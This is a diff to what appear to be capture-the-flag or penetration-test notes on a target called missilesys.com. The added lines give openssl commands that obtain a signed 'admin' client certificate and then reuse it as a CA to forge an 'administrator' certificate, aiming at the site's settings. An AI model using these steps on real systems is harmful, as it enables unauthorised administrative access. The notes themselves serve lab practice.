@@ -31,4 +31,13 @@ I've found that https://dev.missilesys.com/ is also mentioned in the certificate
 Next, we'll need to create a certificate with admin:admin and import to access http://missilesys.com/.
 However, still not possible to access settings - need to be administrator.
 
+How to:
+openssl genrsa -out admin.key
+openssl req -new -key admin.key -out admin.csr (CN=admin, o=International Weapons Export Inc.)
 
+Specify these files in the response.html file to download the signed P12 file from the server.
+
+openssl pkcs12 -in admin.p12 -out admin.crt -clcerts -nokeys
+openssl pkcs12 -in admin.p12 -out admin.key -nocerts -nodes
+openssl x509 -req -days 365 -in administrator.csr -CA admin.crt -CAkey admin.key -set_serial 01 -out administrator.crt
+openssl pkcs12 -export -cacerts -clcerts -in administrator.crt -inkey administrator.key -out administrator.p12
